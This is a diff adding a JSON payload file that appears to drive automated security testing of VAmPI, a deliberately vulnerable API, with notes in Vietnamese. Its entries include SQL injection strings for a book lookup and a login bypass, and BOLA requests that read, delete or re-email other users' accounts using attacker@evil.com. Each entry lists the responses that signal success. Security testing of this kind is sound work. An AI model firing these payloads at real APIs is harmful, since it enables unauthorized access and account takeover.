@@ -1,0 +1,83 @@
+{
+  "payloads": [
+    {
+      "endpoint": "/books/v1/{book_title}",
+      "method": "GET",
+      "target_param": "book_title",
+      "param_location": "path",
+      "attack_type": "SQL_INJECTION",
+      "payload_value": "test' OR '1'='1",
+      "owasp_category": "API8:2023 Security Misconfiguration",
+      "context": "Tham số book_title trên path được nối trực tiếp vào câu lệnh SQL backend trong VAmPI mà không được sanitize.",
+      "expected_signal": [
+        "sql",
+        "syntax",
+        "sqlite3",
+        "database"
+      ],
+      "target_app": "vampi"
+    },
+    {
+      "endpoint": "/users/v1/{username}",
+      "method": "GET",
+      "target_param": "username",
+      "param_location": "path",
+      "attack_type": "BOLA",
+      "payload_value": "admin",
+      "owasp_category": "API1:2023 Broken Object Level Authorization",
+      "context": "Endpoint cho phép xem thông tin user qua username trên path mà thiếu kiểm tra quyền sở hữu tài nguyên.",
+      "expected_signal": [
+        "email",
+        "password",
+        "admin"
+      ],
+      "target_app": "vampi"
+    },
+    {
+      "endpoint": "/users/v1/{username}",
+      "method": "DELETE",
+      "target_param": "username",
+      "param_location": "path",
+      "attack_type": "BOLA",
+      "payload_value": "admin",
+      "owasp_category": "API1:2023 Broken Object Level Authorization",
+      "context": "Cho phép xóa bất kỳ tài khoản người dùng nào thông qua việc thay đổi username trên path nếu thiếu xác thực quyền.",
+      "expected_signal": [
+        "successfully deleted",
+        "user deleted"
+      ],
+      "target_app": "vampi"
+    },
+    {
+      "endpoint": "/users/v1/{username}/email",
+      "method": "PUT",
+      "target_param": "email",
+      "param_location": "body",
+      "attack_type": "BOLA",
+      "payload_value": "attacker@evil.com",
+      "owasp_category": "API1:2023 Broken Object Level Authorization",
+      "context": "Cho phép thay đổi email của người dùng khác bằng cách thao tác trên path username mà không kiểm tra token JWT.",
+      "expected_signal": [
+        "email updated",
+        "success"
+      ],
+      "target_app": "vampi"
+    },
+    {
+      "endpoint": "/users/v1/login",
+      "method": "POST",
+      "target_param": "username",
+      "param_location": "body",
+      "attack_type": "SQL_INJECTION",
+      "payload_value": "admin' --",
+      "owasp_category": "API8:2023 Security Misconfiguration",
+      "context": "Tham số username trong request body đăng nhập có thể bị chèn SQL injection để bypass xác thực.",
+      "expected_signal": [
+        "auth_token",
+        "token",
+        "success"
+      ],
+      "target_app": "vampi"
+    }
+  ]
+}
